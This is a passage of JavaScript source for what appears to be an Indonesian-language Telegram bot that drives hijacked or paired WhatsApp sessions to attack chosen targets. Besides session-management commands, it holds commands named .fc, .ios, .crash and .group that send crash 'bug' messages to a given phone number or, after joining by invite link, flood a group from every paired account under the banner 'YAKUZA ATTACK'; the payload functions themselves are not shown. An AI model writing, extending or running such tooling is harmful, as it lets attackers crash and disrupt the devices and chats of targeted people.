      const botNumber = args[0].replace(/[^0-9]/g, "");

      if (!botNumber || botNumber.length < 10) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴡʜᴀᴛsᴀᴘᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      await connectToWhatsApp(client, botNumber, chatId);

    } catch (error) {
      console.error("Error in reqpair command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .listpair
if (msg.text?.startsWith(`${prefix}listpair`)) {
  (async () => {
    try {
      const chatId = msg.chatId || msg.chat.id;

      if (!fs.existsSync(SESSIONS_FILE)) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      
      if (activeNumbers.length === 0) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const sessionList = activeNumbers.map((number, index) => 
        `${index + 1}. <code>${number}</code>`
      ).join('\n');

      await client.sendMessage(chatId, {
        message: `<blockquote>📝 <b>ʟɪsᴛ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b>\n\n${sessionList}\n\n📋 <b>ᴛᴏᴛᴀʟ:</b> ${activeNumbers.length}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

    } catch (error) {
      console.error("Error in listpair command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀғᴛᴀʀ sᴇssɪᴏɴ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .delpair
if (msg.text?.startsWith(`${prefix}delpair`)) {
  (async () => {
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);

      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}delpair 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const botNumber = args[0].replace(/[^0-9]/g, "");

      if (!fs.existsSync(SESSIONS_FILE)) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ᴀᴋᴛɪғ</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      
      if (!activeNumbers.includes(botNumber)) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>sᴇssɪᴏɴ ᴜɴᴛᴜᴋ ɴᴏ ${botNumber} ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</b></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const updatedNumbers = activeNumbers.filter(num => num !== botNumber);
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));

      const sessionDir = createSessionDir(botNumber);
      try {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      } catch (error) {
        console.error("Error deleting session directory:", error);
      }

      if (sessions.has(botNumber)) {
        sessions.delete(botNumber);
      }

      await client.sendMessage(chatId, {
        message: `<blockquote>✅ <b>sᴇssɪᴏɴ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!</b>\n\n📝 <b>ɴᴏ:</b> <code>${botNumber}</code>\n📋 <b>sɪsᴀ sᴇssɪᴏɴ:</b> ${updatedNumbers.length}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

    } catch (error) {
      console.error("Error in delpair command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs sᴇssɪᴏɴ!</b>\n\n📝 <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .refresh
if (msg.text?.startsWith(`${prefix}refresh`)) {
  (async () => {
    try {
      const chatId = msg.chatId || msg.chat.id;

      const statusMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🔄 <b>ᴍᴇᴍᴜʟᴀɪ ʀᴇғʀᴇsʜ sᴇssɪᴏɴ...</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const previousSessionCount = sessions.size;

      sessions.clear();

      await initializeWhatsAppConnections(client);

      const currentSessionCount = sessions.size;

      let sessionList = '';
      if (currentSessionCount > 0) {
        sessions.forEach((sock, number) => {
          const status = sock.ws.readyState === 1 ? '🟢 ᴏɴʟɪɴᴇ' : '🔴 ᴏғғʟɪɴᴇ';
          sessionList += `${status} | ${number}\n`;
        });
      }

      await client.editMessage(chatId, {
        message: statusMsg.id,
        text: `<blockquote>✅ <b>ʀᴇғʀᴇsʜ sᴇssɪᴏɴ sᴇʟᴇsᴀɪ</b>\n\n<b>ʙᴇʀʜᴀsɪʟ:</b> ${currentSessionCount} session\n\n${currentSessionCount > 0 ? `<b>sᴇssɪᴏɴ ᴀᴋᴛɪғ:</b>\n${sessionList}` : `❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇssɪᴏɴ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ</b>\n\nɢᴜɴᴀᴋᴀɴ <code>${prefix}reqpair</code> ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ sᴇssɪᴏɴ ʙᴀʀᴜ`}</blockquote>`,
        parseMode: "html"
      });

    } catch (error) {
      console.error('❌ Error .refresh:', error);
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ʀᴇғʀᴇsʜ sᴇssɪᴏɴ:</b> ${error.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .fc
if (msg.text?.startsWith(`${prefix}fc`)) {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);

      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}fc 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      if (sessions.size === 0) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ғᴏʀᴄʟᴏsᴇ 1 ᴍsɢ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 1; i <= 1; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          if (i % 10 === 0) {
            await client.editMessage(chatId, {
              message: sentMessage.id,
              text: `<blockquote>
╭───【<b>ғᴏʀᴄʟᴏsᴇ 1 ᴍsɢ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇɴɢɪʀɪᴍ (${i}/50)
┃➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
╰───────────────
</blockquote>`,
              parseMode: "html"
            });
          }
          
          await nullotax(sock, target);
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ғᴏʀᴄʟᴏsᴇ 1 ᴍsɢ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
┃ ➤ <b>ɢᴀɢᴀʟ:</b> ${errorCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

    } catch (error) {
      console.error("Error crash command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ғᴏʀᴄʟᴏsᴇ 1 ᴍsɢ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber || 'N/A'}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .ios
if (msg.text?.startsWith(`${prefix}ios`)) {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);

      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}ios 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      if (sessions.size === 0) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɪᴏs</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 1; i <= 100; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          if (i % 10 === 0) {
            await client.editMessage(chatId, {
              message: sentMessage.id,
              text: `<blockquote>
╭───【<b>ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɪᴏs</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇɴɢɪʀɪᴍ (${i}/50)
┃➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
╰───────────────
</blockquote>`,
              parseMode: "html"
            });
          }
          
          await iosProduct2(sock, target);
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɪᴏs</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
┃ ➤ <b>ɢᴀɢᴀʟ:</b> ${errorCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

    } catch (error) {
      console.error("Error crash command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙʟᴀɴᴋ ᴄʟɪᴄᴋ ɪᴏs</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber || 'N/A'}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .crash
if (msg.text?.startsWith(`${prefix}crash`)) {
  (async () => {
    let sentMessage;
    
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);

      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}crash 62xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const targetNumber = args[0];
      const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
      const target = `${formattedNumber}@s.whatsapp.net`;

      if (!formattedNumber || formattedNumber.length < 10) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ɴᴏ ᴛᴀʀɢᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      if (sessions.size === 0) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ!</b></blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇᴍᴘʀᴏsᴇs...
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const sock = sessions.values().next().value;
      
      if (!sock) {
        throw new Error("Sock tidak ditemukan. Sessions mungkin kosong");
      }

      if (!sock.user) {
        throw new Error("WhatsApp belum login. Silahkan connect dengan .reqpair");
      }

      if (typeof sock.relayMessage !== 'function') {
        throw new Error("relayMessage tidak tersedia. Socket tidak valid");
      }

      if (!sock.user.id) {
        throw new Error("WhatsApp belum terhubung sepenuhnya");
      }
      
      let successCount = 0;
      let errorCount = 0;
      
      for (let i = 1; i <= 1; i++) {   
        try {
          
          if (!sock || typeof sock.relayMessage !== 'function') {
            throw new Error("Koneksi WhatsApp terputus selama proses");
          }
          
          if (i % 10 === 0) {
            await client.editMessage(chatId, {
              message: sentMessage.id,
              text: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃➤ <b>sᴛᴀᴛᴜs:</b> ᴍᴇɴɢɪʀɪᴍ (${i}/50)
┃➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
╰───────────────
</blockquote>`,
              parseMode: "html"
            });
          }
          
          await LocaNewOtax(sock, target);
          successCount++;

        } catch (bugError) {
          errorCount++;
          
          if (bugError.message.includes('not connected') || 
              bugError.message.includes('socket') ||
              bugError.message.includes('relayMessage')) {
            throw bugError;
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ʙᴇʀʜᴀsɪʟ:</b> ${successCount}
┃ ➤ <b>ɢᴀɢᴀʟ:</b> ${errorCount}
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

    } catch (error) {
      console.error("Error crash command:", error);
      const chatId = msg.chatId || msg.chat.id;
      
      if (sentMessage) {
        try {
          await client.deleteMessages(chatId, [sentMessage.id], { revoke: true });
        } catch (deleteError) {
          console.error("Gagal delete message:", deleteError.message);
        }
      }
      
      await client.sendMessage(chatId, {
        message: `<blockquote>
╭───【<b>ʙᴜɢ ᴄʀᴀsʜ</b>】
┃ ➤ <b>ᴛᴀʀɢᴇᴛ:</b> <code>${formattedNumber || 'N/A'}</code>
┃ ➤ <b>sᴛᴀᴛᴜs:</b> ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!
┃ ➤ <b>ᴇʀʀᴏʀ:</b> <code>${error.message}</code>
╰───────────────
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

// .group
if (msg.text?.startsWith(`${prefix}group`)) {
  (async () => {
    let statusMessage;
    
    try {
      const chatId = msg.chatId || msg.chat.id;
      const args = msg.text.split(" ").slice(1);
      
      if (args.length < 1) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ɢʀᴜᴘ!\nᴄᴏɴᴛᴏʜ: ${prefix}group https://chat.whatsapp.com/xxxx`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const groupLink = args[0].trim();
      const codeMatch = groupLink.match(/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
      
      if (!codeMatch) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ʟɪɴᴋ ɢʀᴜᴘ sᴀʟᴀʜ!\nᴄᴏɴᴛᴏʜ: ${prefix}group https://chat.whatsapp.com/xxxx</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const groupCode = codeMatch[1];

      if (sessions.size === 0) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ. sɪʟᴀʜᴋᴀɴ ɢᴜɴᴀᴋᴀɴ .reqpair ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</blockquote>",
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      statusMessage = await client.sendMessage(chatId, {
        message: "<blockquote>⏳ sᴇᴅᴀɴɢ ᴊᴏɪɴ ɢʀᴜᴘ, ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ...</blockquote>",
        parseMode: "html",
        replyTo: msg.id
      });

      let groupJid;
      let activeSock;
      
      try {
        activeSock = sessions.values().next().value;
        
        if (!activeSock || !activeSock.groupAcceptInvite) {
          throw new Error("ғᴜɴɢsɪ ᴊᴏɪɴ ɢʀᴜᴘ ᴛɪᴅᴀᴋ ᴀᴅᴀ");
        }
        
        groupJid = await activeSock.groupAcceptInvite(groupCode);
        
        await client.editMessage(chatId, {
          message: statusMessage.id,
          text: "<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴊᴏɪɴ ɢʀᴜᴘ! ᴍᴇᴍᴜʟᴀɪ ʙᴜɢ...</blockquote>",
          parseMode: "html"
        });
        
      } catch (err) {
        await client.editMessage(chatId, {
          message: statusMessage.id,
          text: `<blockquote>❌ ɢᴀɢᴀʟ ᴊᴏɪɴ ɢʀᴜᴘ: ${err.message}</blockquote>`,
          parseMode: "html"
        });
        return;
      }

      const target = groupJid;
      
      await client.editMessage(chatId, {
        message: statusMessage.id,
        text: `<blockquote>
╔─═⊱ 𝙔𝘼𝙆𝙐𝙕𝘼 𝘼𝙏𝙏𝘼𝘾𝙆 ═⬡
┃ Target: ${groupLink}
┃ Status: Proses loading...
╰━━━━━━━━━━━━━━━━━─═⬡</blockquote>`,
        parseMode: "html"
      });

      const frames = [
        '▰▱▱▱▱▱▱▱▱▱ 10%',
        '▰▰▱▱▱▱▱▱▱▱ 20%',
        '▰▰▰▱▱▱▱▱▱▱ 30%',
        '▰▰▰▰▱▱▱▱▱▱ 40%',
        '▰▰▰▰▰▱▱▱▱▱ 50%',
        '▰▰▰▰▰▰▱▱▱▱ 60%',
        '▰▰▰▰▰▰▰▱▱▱ 70%',
        '▰▰▰▰▰▰▰▰▱▱ 80%',
        '▰▰▰▰▰▰▰▰▰▱ 90%',
        '▰▰▰▰▰▰▰▰▰▰ 100%'
      ];

      for (let i = 0; i < frames.length; i++) {
        const loadingText = `<blockquote>
╔─═⊱ 𝙔𝘼𝙆𝙐𝙕𝘼 𝘼𝙏𝙏𝘼𝘾𝙆 ═⬡
┃ Target: ${groupLink}
┃ ${frames[i]}
╰━━━━━━━━━━━━━━━━━─═⬡</blockquote>`;

        await client.editMessage(chatId, {
          message: statusMessage.id,
          text: loadingText,
          parseMode: "html"
        });

        await sleep(400);
      }

      await client.editMessage(chatId, {
        message: statusMessage.id,
        text: `<blockquote>
╔─═⊱ 𝙔𝘼𝙆𝙐𝙕𝘼 𝘼𝙏𝙏𝘼𝘾𝙆 ═⬡
┃ Target: ${groupLink}
┃ Status: Mengirim bug ke grup...
┃ Total Bot: ${sessions.size}
╰━━━━━━━━━━━━━━━━━─═⬡</blockquote>`,
        parseMode: "html"
      });

      let successCount = 0;
      let failCount = 0;
      let totalSent = 0;

      for (const [botNum, sock] of sessions.entries()) {
        try {
          if (!sock.user) {
            console.log(`Bot ${botNum} tidak terhubung, melewati...`);
            failCount++;
            continue;
          }

          for (let i = 0; i < 30; i++) {
            try {
              await crashGP(sock, target);
              successCount++;
              totalSent++;
              
              if (totalSent % 5 === 0) {
                await client.editMessage(chatId, {
                  message: statusMessage.id,
                  text: `<blockquote>
╔─═⊱ 𝙔𝘼𝙆𝙐𝙕𝘼 𝘼𝙏𝙏𝘼𝘾𝙆 ═⬡
┃ Target: ${groupLink}
┃ Status: Mengirim bug... (${totalSent} pesan)
┃ Berhasil: ${successCount}
┃ Gagal: ${failCount}
╰━━━━━━━━━━━━━━━━━─═⬡</blockquote>`,
                  parseMode: "html"
                });
              }
              
            } catch (sendError) {
              console.log(`Gagal kirim ke grup dari bot ${botNum} (coba ${i + 1}):`, sendError.message);
            }
          }

          console.log(`Bot ${botNum} berhasil mengirim serangan ke grup`);

        } catch (error) {
          console.error(`Error pada bot ${botNum}:`, error);
          failCount++;
        }
      }

      const resultText = `<blockquote>
╔─═⊱ 𝙃𝘼𝙎𝙄𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 ═⬡
┃ Target: ${groupLink}
┃ Berhasil: ${successCount}
┃ Gagal: ${failCount}
┃ Total Bot: ${sessions.size}
╰━━━━━━━━━━━━━━━━━─═⬡</blockquote>`;

      await client.editMessage(chatId, {
        message: statusMessage.id,
        text: resultText,
        parseMode: "html"
      });

    } catch (error) {
      console.error("Error in group command:", error);
      
      if (statusMessage) {
        try {
          await client.editMessage(chatId, {
            message: statusMessage.id,
            text: `<blockquote>❌ Error: ${error.message}</blockquote>`,
            parseMode: "html"
          });
        } catch (editError) {
          await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
          });
        }
      } else {
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
      }
    }
  })();
  return;
}

      // .prefix
      if (msg.text?.startsWith(`${prefix}prefix`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      const userId = msg.sender?.id || msg.from?.id || msg.author?.id;
      
      if (!userId) {
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>❌ Tidak dapat mengidentifikasi pengguna</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }
      
      const args = msg.text.split(" ").slice(1).join(" ").trim();
      
      if (!args) {
        const userPrefix = getUserPrefix(userId);
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>📌 ᴘʀᴇғɪx ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ: <b>"${userPrefix}"</b></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      if (args === '""' || args === '"' || args === 'reset' || args === 'default') {
        saveUserPrefix(userId, ".");
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>✅ ᴘʀᴇғɪx ᴅɪʀᴇsᴇᴛ ᴋᴇ ᴅᴇꜰᴀᴜʟᴛ: <b>"."</b> (hanya untuk Anda)</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      if (args.length > 3) {
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>⚠️ ᴘʀᴇғɪx ᴍᴀᴋsɪᴍᴀʟ 3 ᴋᴀʀᴀᴋᴛᴇʀ</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const success = saveUserPrefix(userId, args);
      
      if (success) {
        await client.sendMessage(msg.chatId, {
          message: `<blockquote>✅ ᴘʀᴇғɪx ʙᴇʀʜᴀsɪʟ ᴅɪᴜʙᴀʜ ᴋᴇ: <b>"${args}"</b> (hanya untuk Anda)</blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
      } else {
        throw new Error('Gagal menyimpan ke file');
      }

    } catch (e) {
      console.error("Prefix error:", e);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}

       // .prem
async function getUserIdFromMessage(msg, text, requireTarget = true) {
    try {
        if (msg.replyTo && msg.replyTo.replyToMsgId) {
            try {
                const repliedMsg = await msg.getReplyMessage?.() || 
                                  await client.getMessages(msg.chatId, { 
                                      ids: msg.replyTo.replyToMsgId 
                                  });
                
                if (repliedMsg) {
